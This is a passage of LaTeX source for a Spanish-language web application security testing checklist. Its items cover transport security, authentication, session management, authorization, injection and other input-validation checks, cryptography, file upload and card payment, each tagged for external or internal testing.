	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar las políticas (por ejemplo, Flash, Silverlight, robots)
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar datos que no son de producción en un entorno en vivo y viceversa
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Comprobar si hay datos confidenciales en el código del lado del cliente (por ejemplo, claves API, credenciales)
\end{todolist}
\item  Transmisión segura
\begin{todolist}
    	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar que las peticiones con datos relevantes o en su defecto, todas las peticiones, son cifradas.
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar la versión de SSL, los algoritmos, la longitud de la clave
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar la validez del certificado digital (duración, firma y CN)
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar las credenciales que solo se envían a través de HTTPS
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar que el formulario de inicio de sesión se envíe a través de HTTPS
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Verificar los tokens de sesión que solo se envían a través de HTTPS
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Comprobar si se utiliza HTTP Strict Transport Security (HSTS)
\end{todolist}

\item  Revisar autenticación
\begin{todolist}
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar enumeración de usuarios
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar omisión de autenticación
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar protección contra fuerza bruta
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar las reglas de calidad de las contraseñas
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar la funcionalidad Recordarme
	\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno}  Probar autocompletar en formularios de contraseña 
\end{todolist}
\item Revisar gestión de sesiones
\begin{todolist}
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Establecer cómo se maneja la gestión de sesiones en la aplicación (por ejemplo, tokens en cookies, token en URL)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar los tokens de sesión en busca de indicadores de cookies (httpOnly y seguro)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar el alcance de la cookie de sesión (ruta y dominio)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la duración de la cookie de sesión (caduca y edad máxima)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la terminación de la sesión después de una vida útil máxima
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la terminación de la sesión después del tiempo de espera relativo
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar la terminación de la sesión después de cerrar la sesión
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar para ver si los usuarios pueden tener varias sesiones simultáneas
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar las cookies de sesión para determinar la aleatoriedad
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Confirme que se emiten nuevos tokens de sesión al iniciar sesión, cambiar de rol y cerrar sesión
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar la administración de sesiones consistente en todas las aplicaciones con administración de sesiones compartidas
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar para la desconcertante sesión
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar para CSRF y clickjacking
\end{todolist}

\item  Revisar autorización
\begin{todolist}
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  recorrido de ruta
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar para omitir el esquema de autorización
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  problemas de control de acceso vertical (también conocido como Privilege Escalation)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  problemas de control de acceso horizontal (entre dos usuarios con el mismo nivel de privilegios)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar si falta la autorización
\end{todolist}
\item  Revisar validación de datos. Según el tipo de solicitud y datos que se envian.
\begin{todolist}
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  secuencias de comandos de sitios cruzados reflejados
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  secuencias de comandos de sitios cruzados almacenadas
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  secuencias de comandos de sitios cruzados basadas en DOM
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  flasheo entre sitios
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de HTML
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección SQL
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección LDAP
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de ORM
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección XML
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección XXE
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de SSI
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección XPath
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección XQuery
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección IMAP / SMTP
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de código
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de lenguaje de expresión
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección de comando
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  desbordamiento (pila, montón y entero)
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  cadena de formato
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  vulnerabilidades incubadas
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  división / contrabando de HTTP
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  manipulación de verbos HTTP
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  redireccionamiento abierto
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inclusión de archivos locales
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inclusión de archivos remotos
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Comparar las reglas de validación del lado del cliente y del lado del servidor
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  inyección NoSQL
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  contaminación de parámetros HTTP
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  encuadernación automática
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  asignación masiva
		\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar  cookie de sesión NULL / no válida
\end{todolist}
\item Lógica de negocio
\begin{todolist}
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de uso indebido de funciones
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de falta de no repudio
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar las relaciones de confianza
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de la integridad de los datos
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar la segregación de funciones
\end{todolist}
\item Criptografía
\begin{todolist}
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Comprobar si los datos que deben cifrarse no están
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar el uso de algoritmos incorrectos según el contexto
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar el uso de algoritmos débiles
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar el uso adecuado de la salazón
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Verificar las funciones de aleatoriedad
\end{todolist}
\item (Según sea el caso) Funcionalidad arriesgada: carga de archivos
\begin{todolist}
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los tipos de archivos aceptables estén incluidos en la lista blanca
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los límites de tamaño de archivo, la frecuencia de carga y el recuento total de archivos estén definidos y se cumplan
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que el contenido del archivo coincida con el tipo de archivo definido
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que todas las cargas de archivos tengan un análisis antivirus en su lugar.
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los nombres de archivo inseguros estén desinfectados
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los archivos cargados no sean directamente accesibles dentro de la raíz web
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los archivos cargados no se sirvan en el mismo nombre de host / puerto
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar que los archivos y otros medios estén integrados con los esquemas de autenticación y autorización.
\end{todolist}
\item (Según sea el caso) Funcionalidad arriesgada: pago con tarjeta
\begin{todolist}
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar las vulnerabilidades conocidas y los problemas de configuración en el servidor web y la aplicación web
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar la contraseña predeterminada o que se pueda adivinar
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de datos que no son de producción en un entorno en vivo y viceversa
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de vulnerabilidades de inyección
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de desbordamientos de búfer
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de almacenamiento criptográfico inseguro
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de protección insuficiente de la capa de transporte
\item\tikzmarknode[fill=cyan,fill opacity=0.3,draw=green!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Externo} \tikzmarknode[fill=purple,fill opacity=0.3,draw=purple!60!black,thick,rounded corners,inner sep=2pt,text opacity=1]{test}{Interno} Probar de manejo inadecuado de errores
